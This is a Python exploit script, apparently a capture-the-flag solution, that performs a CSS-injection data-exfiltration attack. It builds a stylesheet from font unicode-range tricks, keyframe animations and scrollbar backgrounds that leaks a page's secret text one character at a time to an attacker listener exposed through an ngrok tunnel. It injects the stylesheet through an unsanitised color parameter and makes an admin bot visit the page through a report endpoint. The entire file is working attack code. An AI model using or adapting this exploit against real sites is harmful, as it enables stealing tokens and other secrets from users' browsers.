from math import fabs
from ssl import cert_time_to_seconds
from PIL import ImageFont
from fontTools.ttLib import TTFont
import string
import requests
from urllib.parse import quote, quote_plus
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import re
import os
from pyngrok import ngrok
import logging
from yaml import FlowMappingStartToken

logging.disable(logging.INFO)
FLAG = ''
class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        global FLAG
        #logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        logging.info(self.path)
        ch = re.findall(r'/\?(.)',self.path)
        if len(ch) > 0:
            ch = ch[0]
        if ch not in FLAG:
            FLAG=FLAG+ch
            print(FLAG)
            if len(FLAG)==8:
                os._exit(1)
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def log_message(self, format, *args):
        return

FONT = 'Liberation Mono'
TARGET_URL = 'http://127.0.0.1:8000'

def create_family(family,range,size):
    font_face = "@font-face{{font-family:{family};size-adjust:{size};src:local('"+FONT+"');unicode-range:{uni_range};font-style:monospace;}}"
    uni_range = ''
    if range is not None:
        uni_range+='U+'+hex(ord(range))[2:]
    else:
        uni_range+='U+?????'
    if family is None:
        if range is None:
            family = 'rest'
            size = '100%'
        else:
            family = 'has_'+hex(ord(range))[2:]
    return family,font_face.format(family=family,uni_range=uni_range,size=size)


def create_animation(n,w,families,url):
    animation = ''
    outer = "@keyframes loop {{\n {frames} \n}}"
    frame = "{x}% {{ width: {w}px; }}"
    frames = ''
    for i in range(0,n+2):
        frames+=frame.format(x=i,w=w*(i+2))+'\n'

    animation = outer.format(frames=frames)+'\n'

    inner = "@keyframes trychar{num} {{\n {frames_inner} \n}}"
    frame_inner = "{x}% {{ {content} }}"
    frames_inner = ''
    reset_f = "font-family: rest;"
    set_f = "font-family: {family}, rest; --leak: url({url}?{letter});"

    i = 0
    num = 0
    for k,v in families.items():
        content = ''
        content = reset_f
        frames_inner += frame_inner.format(x=i,content=content)+'\n'
        i+=1
        content = set_f.format(family=v,letter=k,url=url)
        frames_inner += frame_inner.format(x=i,content=content)+'\n'
        i+=1
        if(i==100):
            content = reset_f
            frames_inner += frame_inner.format(x=i,content=content)+'\n'
            animation+=inner.format(frames_inner=frames_inner,num=num) + '\n'
            frames_inner = ''
            i=0
            num+=1
    
    animation+=inner.format(frames_inner=frames_inner,num=num)
    return num+1,animation

def create_leak_style(selector,h,num,n):
    scrollbar = "{selector}::-webkit-scrollbar {{ background: blue; }}\n{selector}::-webkit-scrollbar:vertical {{ background: var(--leak); }}"
    leak = "{selector}::first-line{{ font-size: 30px; }}"
    main = "{selector} {{ overflow-y: auto; overflow-x: hidden; font-size: 0px; height: {h}px; width: 0px; {animation} font-family: rest; word-break: break-all; }}"
    animation = 'animation: '
    animation_it = 'animation-iteration-count: '
    n=200
    for i in range(0,num):
        if animation != 'animation: ':
            animation+=','
            animation_it+=','
        animation+='loop step-end {n}s {n2}s, trychar{i} step-end 2s {n2}s'.format(i=i,n=n,n2=n*i)
        animation_it+='1 , {n}'.format(n=n)
    animation+=';'
    animation_it+=';'
    animation+=animation_it
    leak = scrollbar.format(selector=selector)+'\n'+leak.format(selector=selector)+'\n'+main.format(selector=selector,h=h,animation=animation)
    return leak

def create_stylesheet(n,selector,url):
    stylesheet = ""
    families = {}
    font = ImageFont.truetype('/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf',size=30)
    w,h = font.getsize('A')
    for i in string.ascii_lowercase + string.digits:
        family, style = create_family(family=None,range=i,size='200%')
        stylesheet+=style+'\n'
        families[i] = family
    family, style = create_family(family=None,range=None,size='200%')
    stylesheet+=style+'\n'
    families[i] = family

    num,animation = create_animation(n,w,families,url)

    stylesheet+='\n'+animation
    leak = create_leak_style(selector,h+h//2,num,n)
    stylesheet+='\n'+leak+'\n'
    return stylesheet

def send_stylesheet():
    http_tunnel = ngrok.connect(8888)
    s=create_stylesheet(8,'div',http_tunnel.public_url)
    #open('test.html','w').write(s)
    color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
    #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
    color = quote_plus(f"?color={color}")
    res = requests.get(f"{TARGET_URL}/report?path={color}")
    #print(res.url)

def receive_flag():
    server_class=HTTPServer
    handler_class=S
    port=8888
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

def main():
    t1 = threading.Thread(target=send_stylesheet)
    t2 = threading.Thread(target=receive_flag)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

if __name__ == "__main__":
    main()